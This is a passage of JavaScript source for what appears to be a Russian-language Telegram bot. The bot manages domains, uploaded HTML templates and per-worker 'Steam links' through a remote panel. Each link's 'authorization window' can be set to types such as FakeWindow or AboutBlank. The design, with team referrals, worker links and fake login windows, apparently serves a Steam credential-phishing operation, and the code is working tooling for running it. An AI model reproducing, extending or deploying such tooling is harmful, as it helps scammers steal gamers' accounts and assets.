      reply_markup: linkCreatorKeyboard(ctx.session.linkCreate.domainId, ctx.session.linkCreate).reply_markup,
    });
  });

  bot.action("sites:link:editor", async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Сессия завершена", { show_alert: true });
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
      reply_markup: linkCreatorKeyboard(ctx.session.linkCreate.domainId, ctx.session.linkCreate).reply_markup,
    });
  });

  bot.action(/^sites:link:create:(\d+)$/, async (ctx) => {
    const state = ctx.session?.linkCreate;
    if (!state || state.domainId !== Number(ctx.match[1]) || !state.templateId) {
      return ctx.answerCbQuery("Выберите шаблон и начните заново", { show_alert: true });
    }
    await ctx.answerCbQuery();
    try {
      const auth = await getPanelToken(await ensureUser(ctx.from));
      const created = await createSteamLink(auth.token, linkPayload(state.domainId, state));
      ctx.session.linkCreate = null;
      await upsertBotMessage(
        ctx,
        `${pe("success")} <b>Ссылка создана</b>\n\n<code>/${created?.path || state.path || "random"}</code>`,
        { reply_markup: { inline_keyboard: [[btn("К домену", `sites:domain:${state.domainId}`, "home")]] } }
      );
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action("sites:links:noop", (ctx) => ctx.answerCbQuery("Это существующая ссылка"));

  bot.action(/^sites:link:open:(\d+):(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const linkId = Number(ctx.match[2]);
    await ctx.answerCbQuery();
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      const cache = await getReferralView(ctx, user, domainId, auth, { force: true, linkId });
      await renderReferralCard(ctx, cache);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
        reply_markup: {
          inline_keyboard: [[btn("К домену", `sites:domain:${domainId}`, "home")]],
        },
      });
    }
  });

  bot.action(/^sites:ref:refresh:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery("Обновляю…");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      await showReferral(ctx, user, domainId, auth, { force: true });
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:delete:ask:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      [
        `${pe("delete")} <b>Удалить реферальную ссылку?</b>`,
        "",
        "Ссылка перестанет работать. Новую можно создать снова кнопкой «Реферальная ссылка».",
      ].join("\n"),
      { reply_markup: referralDeleteConfirmKeyboard(domainId).reply_markup }
    );
  });

  bot.action(/^sites:ref:delete:ok:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery("Удаляю…");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      const cached = getReferralCache(ctx, domainId);
      const existing =
        cached?.existing ||
        (await getTeamReferralForDomain(user.telegramId, domainId));
      const linkId = existing?.panelLinkId || cached?.row?.id;
      if (!existing && !linkId) {
        clearReferralCache(ctx);
        await upsertBotMessage(
          ctx,
          `${pe("info")} Реферальной ссылки нет.`,
          {
            reply_markup: {
              inline_keyboard: [[btn("К домену", `sites:domain:${domainId}`, "home")]],
            },
          }
        );
        return;
      }

      if (linkId) {
        try {
          let windowType = normalizeWindowType(cached?.row?.windowType || "FakeWindow");
          const panelLink = await findWorkerPanelLink(auth.token, domainId, {
            panelLinkId: linkId,
            path: existing?.path,
          });
          if (panelLink?.windowType) windowType = panelLink.windowType;
          await deleteSteamLink(auth.token, domainId, linkId, { windowType });
        } catch (_) {
          // Mongo всё равно очистим — ссылку можно пересоздать.
        }
      }

      if (linkId) await clearTeamReferralByLinkId(user.telegramId, linkId);
      else if (existing) await clearTeamReferralForDomain(user.telegramId, domainId);
      clearReferralCache(ctx);
      await upsertBotMessage(
        ctx,
        [
          `${pe("success")} <b>Реферальная ссылка удалена</b>`,
          "",
          "Чтобы создать новую — откройте домен и нажмите «Реферальная ссылка».",
        ].join("\n"),
        {
          reply_markup: {
            inline_keyboard: [[btn("К домену", `sites:domain:${domainId}`, "home")]],
          },
        }
      );
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:params:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    try {
      const cache = getReferralCache(ctx, domainId);
      if (cache) {
        await renderReferralParams(ctx, cache);
        return;
      }
      const user = await ensureUser(ctx.from);
      await showReferralParams(ctx, user, domainId, await resolvePanelAuth(ctx, user));
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:param:(\d+):([a-zA-Z_]+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const key = ctx.match[2];
    await ctx.answerCbQuery();
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      let cache = getReferralCache(ctx, domainId);
      if (!cache) cache = await getReferralView(ctx, user, domainId, auth);
      const linkId = cache.existing?.panelLinkId || cache.row?.id;
      if (!linkId) throw new Error("Ссылка не найдена.");
      const def = getLinkParamDefs(cache.row).find((param) => param.key === key);
      if (!def) throw new Error("Неизвестный параметр.");
      const patch = def.patch(!def.value);
      await updateSteamLink(auth.token, domainId, linkId, linkUpdatePayload(cache, patch));
      cache.row = applyLinkPatchToRow(cache.row, patch);
      setReferralCache(ctx, cache);
      await renderReferralParams(ctx, cache);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
      clearPendingInputs(ctx);
      ctx.session.refCreate = {
        step: "path",
        domainId,
        domainName: domain.domain || "",
        path: "",
        templateId: null,
        templateName: "",
        windowType: "FakeWindow",
      };
      await upsertBotMessage(
        ctx,
        [
          `${pe("gift")} <b>Реферальная ссылка</b> · шаг 1/3`,
          "",
          `Домен: <code>${escapeHtml(domain.domain)}</code>`,
          "",
          "Укажите адрес страницы.",
          `Например для <code>${escapeHtml(domain.domain)}</code> отправьте <code>promo</code>`,
          `и ссылка будет <code>${escapeHtml(domain.domain)}/promo</code>.`,
          "",
          `${pe("info")} Отправьте только часть после домена.`,
        ].join("\n"),
        {
          reply_markup: {
            inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]],
          },
        }
      );
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:create:tpl:new:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const flow = ctx.session?.refCreate;
    if (!flow || Number(flow.domainId) !== domainId || flow.step !== "template") {
      return ctx.answerCbQuery("Сессия устарела", { show_alert: true });
    }
    await ctx.answerCbQuery();
    ctx.session.templateFlow = { step: "name", returnTo: "refCreate" };
    await upsertBotMessage(
      ctx,
      [
        `${pe("code")} <b>Добавление шаблона</b> · шаг 1/3`,
        "",
        "Укажите название шаблона.",
      ].join("\n"),
      {
        reply_markup: {
          inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]],
        },
      }
    );
  });

  bot.action(/^sites:ref:create:tpl:search:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const flow = ctx.session?.refCreate;
    if (!flow || Number(flow.domainId) !== domainId || flow.step !== "template") {
      return ctx.answerCbQuery("Сессия устарела", { show_alert: true });
    }
    ctx.session.linkCreateStep = "ref_create_template_id_input";
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("edit")} Введите <b>ID шаблона</b> (только цифры).`, {
      reply_markup: {
        inline_keyboard: [[btn("Отменить", `sites:ref:${domainId}`, "error")]],
      },
    });
  });

  bot.action(/^sites:ref:create:tpl:(\d+):(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const templateId = Number(ctx.match[2]);
    const flow = ctx.session?.refCreate;
    if (!flow || Number(flow.domainId) !== domainId || flow.step !== "template") {
      return ctx.answerCbQuery("Сессия устарела", { show_alert: true });
    }
    const template =
      (ctx.session?.linkTemplates || []).find((row) => Number(row.id) === templateId) ||
      (await loadPickerTemplates(ctx)).find((row) => Number(row.id) === templateId);
    if (!template) return ctx.answerCbQuery("Шаблон не найден", { show_alert: true });
    flow.templateId = template.id;
    flow.templateName = template.name || `Template #${template.id}`;
    flow.step = "window";
    await ctx.answerCbQuery("Шаблон выбран");
    await askRefCreateWindowStep(ctx, domainId);
  });

  bot.action(/^sites:ref:create:win:(\d+):(FakeWindow|CurrentWindow|NewWindow|AboutBlank)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const windowType = ctx.match[2];
    const flow = ctx.session?.refCreate;
    if (!flow || Number(flow.domainId) !== domainId || flow.step !== "window" || !flow.path || !flow.templateId) {
      return ctx.answerCbQuery("Сессия устарела", { show_alert: true });
    }
    await ctx.answerCbQuery("Создаю…");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      const created = await createTeamReferralLink(auth, user, domainId, {
        path: flow.path,
        templateId: flow.templateId,
        windowType,
      });
      if (created.row && !created.row.template) {
        created.row.template = { id: flow.templateId, name: flow.templateName };
      }
      if (created.row) created.row.windowType = windowType;
      ctx.session.refCreate = null;
      setReferralCache(ctx, created);
      await renderReferralCard(ctx, created);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
        reply_markup: referralCreateWindowKeyboard(domainId).reply_markup,
      });
    }
  });

  bot.action(/^sites:ref:back:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    try {
      const cache = getReferralCache(ctx, domainId);
      if (cache) {
        await renderReferralCard(ctx, cache);
        return;
      }
      const user = await ensureUser(ctx.from);
      await showReferral(ctx, user, domainId, await resolvePanelAuth(ctx, user));
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:template:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    try {
      const templates = await loadPickerTemplates(ctx);
      if (ctx.session) ctx.session.linkTemplates = templates;
      const hint = templates.length
        ? "Выберите шаблон для реферальной ссылки или найдите по ID."
        : "Нет доступных шаблонов. Можно искать по ID.";
      await upsertBotMessage(ctx, `${pe("file")} <b>Шаблоны</b>\n\n${hint}`, {
        reply_markup: referralTemplatesKeyboard(domainId, templates).reply_markup,
      });
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:template:search:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    ctx.session.linkCreateStep = "ref_template_id_input";
    ctx.session.refTemplateSearchDomainId = domainId;
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("edit")} Введите <b>ID шаблона</b> (только цифры).`, {
      reply_markup: {
        inline_keyboard: [[btn("Отменить", `sites:ref:template:${domainId}`, "error")]],
      },
    });
  });

  bot.action(/^sites:ref:template:set:(\d+):(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const templateId = Number(ctx.match[2]);
    await ctx.answerCbQuery("Шаблон обновлён");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      let cache = getReferralCache(ctx, domainId);
      if (!cache) cache = await getReferralView(ctx, user, domainId, auth);
      const linkId = cache.existing?.panelLinkId || cache.row?.id;
      if (!linkId) throw new Error("Ссылка не найдена.");
      await updateSteamLink(auth.token, domainId, linkId, linkUpdatePayload(cache, { template: templateId }));
      const templateMeta =
        (ctx.session?.linkTemplates || []).find((row) => Number(row.id) === templateId) ||
        (await loadPickerTemplates(ctx)).find((row) => Number(row.id) === templateId) ||
        cache.row?.template ||
        {};
      cache.row = {
        ...cache.row,
        template: {
          id: templateId,
          name: templateMeta.name || cache.row?.template?.name || String(templateId),
        },
      };
      setReferralCache(ctx, cache);
      await renderReferralCard(ctx, cache);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:window:(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("settings")} Выберите окно авторизации.`, {
      reply_markup: referralWindowKeyboard(Number(ctx.match[1])).reply_markup,
    });
  });

  bot.action(/^sites:ref:win:(\d+):(FakeWindow|CurrentWindow|NewWindow|AboutBlank)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const windowType = ctx.match[2];
    await ctx.answerCbQuery("Окно обновлено");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      let cache = getReferralCache(ctx, domainId);
      if (!cache) cache = await getReferralView(ctx, user, domainId, auth);
      const linkId = cache.existing?.panelLinkId || cache.row?.id;
      if (!linkId) throw new Error("Ссылка не найдена.");
      await updateSteamLink(auth.token, domainId, linkId, linkUpdatePayload(cache, { windowType }));
      cache.row = { ...cache.row, windowType };
      setReferralCache(ctx, cache);
      await renderReferralCard(ctx, cache);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.on("text", async (ctx, next) => {
    if (ctx.scene?.current) return next();
    const raw = String(ctx.message.text || "").trim();
    if (isBotCommandText(raw)) {
      clearPendingInputs(ctx);
      return next();
    }
    if (ctx.session?.templateFlow?.step === "name") {
      const name = raw.slice(0, 80).trim();
      if (name.length < 2) {
        await upsertBotMessage(ctx, `${pe("error")} Название слишком короткое (минимум 2 символа).`);
        return;
      }
      ctx.session.templateFlow = {
        step: "public",
        name,
        returnTo: ctx.session.templateFlow.returnTo || null,
      };
      await upsertBotMessage(
        ctx,
        [
          `${pe("code")} <b>Добавление шаблона</b> · шаг 2/3`,
          "",
          `Название: <b>${escapeHtml(name)}</b>`,
          "",
          "Шаблон будет публичным или приватным?",
        ].join("\n"),
        { reply_markup: templatePublicKeyboard().reply_markup }
      );
      return;
    }
    if (ctx.session?.refCreate?.step === "path") {
      const path = normalizeRefPathInput(raw);
      if (!path || path.length < 2) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Укажите адрес (минимум 2 символа), например <code>promo</code>.`
        );
        return;
      }
      if (!/^[a-zA-Z0-9._~\-/=?&%]+$/.test(path)) {
        await upsertBotMessage(
          ctx,
          `${pe("error")} Адрес содержит недопустимые символы. Используйте латиницу, цифры и <code>-_</code>.`
        );
        return;
      }
      try {
        const domainId = Number(ctx.session.refCreate.domainId);
        if (await isTeamReferralPathTaken(domainId, path)) {
          await upsertBotMessage(ctx, `${pe("error")} Такой адрес уже занят. Укажите другой.`);
          return;
        }
        const user = await ensureUser(ctx.from);
        const auth = await resolvePanelAuth(ctx, user);
        const ownLinks = filterActiveSteamLinks(
          ((await getSteamLinks(auth.token, domainId, 0, 100)).rows || []).filter(
            (link) => Number(link.owner) === auth.ownerId
          )
        );
        if (ownLinks.some((link) => String(link.path || "").replace(/^\/+/, "") === path)) {
          await upsertBotMessage(ctx, `${pe("error")} Такой адрес уже занят. Укажите другой.`);
          return;
        }
        ctx.session.refCreate.path = path;
        ctx.session.refCreate.step = "template";
        await askRefCreateTemplateStep(ctx, domainId);
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
      }
      return;
    }
    if (ctx.session?.linkCreateStep === "ref_create_template_id_input" && ctx.session?.refCreate) {
      const templateId = Math.trunc(Number(raw));
      const domainId = Number(ctx.session.refCreate.domainId);
      ctx.session.linkCreateStep = null;
      if (!Number.isFinite(templateId) || templateId < 1) {
        await upsertBotMessage(ctx, `${pe("error")} Введите корректный ID шаблона (число).`, {
          reply_markup: referralCreateTemplatesKeyboard(domainId, await loadPickerTemplates(ctx)).reply_markup,
        });
        return;
      }
      const template =
        (await loadPickerTemplates(ctx)).find((row) => Number(row.id) === templateId) || {
          id: templateId,
          name: `Template #${templateId}`,
        };
      ctx.session.refCreate.templateId = template.id;
      ctx.session.refCreate.templateName = template.name;
      ctx.session.refCreate.step = "window";
      await askRefCreateWindowStep(ctx, domainId);
      return;
    }
    if (ctx.session?.templateFlow?.step === "code") {
      try {
        const user = await ensureUser(ctx.from);
        await finishTemplateCreate(ctx, user, raw);
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
          reply_markup: {
            inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]],
          },
        });
      }
      return;
    }
    if (ctx.session?.sitesFlow?.step === "domain_input") {
      const domain = raw
        .toLowerCase()
        .replace(/^https?:\/\//, "")
        .replace(/^www\./, "")
        .replace(/\/+$/, "");
      if (!domain || !domain.includes(".")) {
        await upsertBotMessage(ctx, `${pe("error")} Введите корректный домен.`);
        return;
      }
      try {
        const auth = await resolvePanelAuth(ctx, await ensureUser(ctx.from));
        const check = await checkDomainAvailability(auth.token, domain);
        if (!check.available) {
          throw new Error(check.message || "Домен недоступен.");
        }
        ctx.session.sitesFlow = {
          step: "bind_confirm",
          domain,
          isPublic: false,
          isTransit: false,
        };
        await showIpBindStep(ctx, ctx.session.sitesFlow, auth);
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
      }
      return;
    }
    if (ctx.session?.linkCreateStep === "path_input" && ctx.session?.linkCreate) {
      ctx.session.linkCreate.path = raw === "-" ? "" : raw.replace(/[\s/]+/g, "");
      ctx.session.linkCreateStep = null;
      await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
        reply_markup: linkCreatorKeyboard(ctx.session.linkCreate.domainId, ctx.session.linkCreate).reply_markup,
      });
      return;
    }
    if (ctx.session?.linkCreateStep === "template_id_input" && ctx.session?.linkCreate) {
      const templateId = Math.trunc(Number(raw));
      ctx.session.linkCreateStep = null;
      if (!Number.isFinite(templateId) || templateId < 1) {
        await upsertBotMessage(ctx, `${pe("error")} Введите корректный ID шаблона (число).`, {
          reply_markup: templatesKeyboard(await loadPickerTemplates(ctx)).reply_markup,
        });
        return;
      }
      const template =
        (await loadPickerTemplates(ctx)).find((row) => Number(row.id) === templateId) || {
          id: templateId,
          name: `Template #${templateId}`,
        };
      Object.assign(ctx.session.linkCreate, { templateId: template.id, templateName: template.name });
      Object.assign(ctx.session.linkCreate, {
        templateId: template.id,
        templateName: template.name,
      });
      await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
        reply_markup: linkCreatorKeyboard(ctx.session.linkCreate.domainId, ctx.session.linkCreate).reply_markup,
      });
      return;
    }
    if (ctx.session?.linkCreateStep === "ref_template_id_input") {
      const domainId = Number(ctx.session.refTemplateSearchDomainId);
      const templateId = Math.trunc(Number(raw));
      ctx.session.linkCreateStep = null;
      ctx.session.refTemplateSearchDomainId = null;
      if (!Number.isFinite(domainId) || domainId < 1) {
        await upsertBotMessage(ctx, `${pe("error")} Сессия поиска шаблона устарела.`);
        return;
      }
      if (!Number.isFinite(templateId) || templateId < 1) {
        await upsertBotMessage(ctx, `${pe("error")} Введите корректный ID шаблона (число).`, {
          reply_markup: referralTemplatesKeyboard(domainId, await loadPickerTemplates(ctx)).reply_markup,
        });
        return;
      }
      try {
        const user = await ensureUser(ctx.from);
        const auth = await resolvePanelAuth(ctx, user);
        let cache = getReferralCache(ctx, domainId);
        if (!cache) cache = await getReferralView(ctx, user, domainId, auth);
        const linkId = cache.existing?.panelLinkId || cache.row?.id;
        if (!linkId) throw new Error("Ссылка не найдена.");
        await updateSteamLink(auth.token, domainId, linkId, linkUpdatePayload(cache, { template: templateId }));
        const templateMeta =
          (await loadPickerTemplates(ctx)).find((row) => Number(row.id) === templateId) || {};
        cache.row = {
          ...cache.row,
          template: {
            id: templateId,
            name: templateMeta.name || cache.row?.template?.name || String(templateId),
          },
        };
        setReferralCache(ctx, cache);
        await renderReferralCard(ctx, cache);
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
      }
      return;
    }
    return next();
  });

  bot.on("document", async (ctx, next) => {
    if (ctx.scene?.current) return next();
    if (ctx.session?.templateFlow?.step !== "code") return next();

    const doc = ctx.message.document;
    const fileName = String(doc?.file_name || "");
    const mime = String(doc?.mime_type || "");
    const isHtml =
      /\.html?$/i.test(fileName) ||
      /html|text\/plain|application\/octet-stream/i.test(mime);
    if (!doc?.file_id || !isHtml) {
      await upsertBotMessage(
        ctx,
        `${pe("error")} Пришлите HTML-файл (<code>.html</code>) или текст с кодом.`,
        {
          reply_markup: {
            inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]],
          },
        }
      );
      return;
    }
    if (Number(doc.file_size || 0) > 2 * 1024 * 1024) {
      await upsertBotMessage(ctx, `${pe("error")} Файл слишком большой (макс. 2 МБ).`);
      return;
    }

    try {
      const link = await ctx.telegram.getFileLink(doc.file_id);
      const downloaded = await axios.get(String(link.href || link), {
        responseType: "arraybuffer",
        timeout: 30000,
        maxContentLength: 2 * 1024 * 1024,
      });
      const html = Buffer.from(downloaded.data).toString("utf8");
      const user = await ensureUser(ctx.from);
      await finishTemplateCreate(ctx, user, html);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
        reply_markup: {
          inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]],
        },
      });
    }
  });
}

module.exports = { registerSitesHandlers, filterAvailableDomains, filterOwnDomainsOnly, getPanelToken };
